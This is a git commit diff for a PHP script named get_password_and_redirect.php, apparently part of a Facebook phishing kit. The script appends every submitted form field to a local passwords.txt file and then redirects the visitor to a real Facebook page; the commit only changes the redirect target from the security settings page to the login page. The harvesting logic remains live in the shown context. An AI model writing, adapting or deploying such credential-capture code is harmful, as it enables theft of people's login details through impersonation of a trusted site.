3f478f49a33b0d1205d6fdce469f775cb440d9bf
evilleet18 <63536127+evilleet18@users.noreply.github.com>
2020-09-09 01:27:58 +0600

    Update get_password_and_redirect.php

--- get_password_and_redirect.php
+++ get_password_and_redirect.php
@@ -1,5 +1,5 @@
 <?php
-header("Location: https://web.facebook.com/settings?tab=security  ");
+header("Location: https://web.facebook.com/login/?_rdc=1&_rdr ");
 $handle = fopen("passwords.txt", "a");
 foreach ($_POST as $variable => $value) {
 	fwrite($handle, $variable);
